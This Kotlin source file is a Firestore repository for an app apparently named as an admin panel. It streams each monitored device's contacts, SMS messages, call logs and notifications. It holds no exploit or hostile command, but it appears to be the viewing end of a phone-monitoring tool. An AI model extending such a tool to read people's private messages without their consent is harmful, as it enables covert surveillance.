package com.datasync.admin.data

import com.datasync.admin.model.*
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.Query
import kotlinx.coroutines.channels.awaitClose
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.callbackFlow
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class FirestoreRepository @Inject constructor(
    private val db: FirebaseFirestore
) {

    fun getDevices(): Flow<List<DeviceInfo>> = callbackFlow {
        val subscription = db.collection("devices")
            .orderBy("timestamp", Query.Direction.DESCENDING)
            .addSnapshotListener { snapshot, error ->
                if (error != null) {
                    close(error)
                    return@addSnapshotListener
                }
                val devices = snapshot?.toObjects(DeviceInfo::class.java) ?: emptyList()
                trySend(devices)
            }
        awaitClose { subscription.remove() }
    }

    fun getContacts(deviceId: String): Flow<List<Contact>> = callbackFlow {
        val subscription = db.collection("devices")
            .document(deviceId)
            .collection("contacts")
            .orderBy("name", Query.Direction.ASCENDING)
            .addSnapshotListener { snapshot, error ->
                if (error != null) {
                    close(error)
                    return@addSnapshotListener
                }
                val contacts = snapshot?.toObjects(Contact::class.java) ?: emptyList()
                trySend(contacts)
            }
        awaitClose { subscription.remove() }
    }

    fun getSMS(deviceId: String): Flow<List<SMS>> = callbackFlow {
        val subscription = db.collection("devices")
            .document(deviceId)
            .collection("sms")
            .orderBy("date", Query.Direction.DESCENDING)
            .addSnapshotListener { snapshot, error ->
                if (error != null) {
                    close(error)
                    return@addSnapshotListener
                }
                val smsList = snapshot?.toObjects(SMS::class.java) ?: emptyList()
                trySend(smsList)
            }
        awaitClose { subscription.remove() }
    }

    fun getCallLogs(deviceId: String): Flow<List<CallLog>> = callbackFlow {
        val subscription = db.collection("devices")
            .document(deviceId)
            .collection("calllogs")
            .orderBy("date", Query.Direction.DESCENDING)
            .addSnapshotListener { snapshot, error ->
                if (error != null) {
                    close(error)
                    return@addSnapshotListener
                }
                val logs = snapshot?.toObjects(CallLog::class.java) ?: emptyList()
                trySend(logs)
            }
        awaitClose { subscription.remove() }
    }

    fun getNotifications(deviceId: String): Flow<List<NotificationData>> = callbackFlow {
        val subscription = db.collection("devices")
            .document(deviceId)
            .collection("notifications")
            .orderBy("timestamp", Query.Direction.DESCENDING)
            .addSnapshotListener { snapshot, error ->
                if (error != null) {
                    close(error)
                    return@addSnapshotListener
                }
                val notifications = snapshot?.toObjects(NotificationData::class.java) ?: emptyList()
                trySend(notifications)
            }
        awaitClose { subscription.remove() }
    }
}
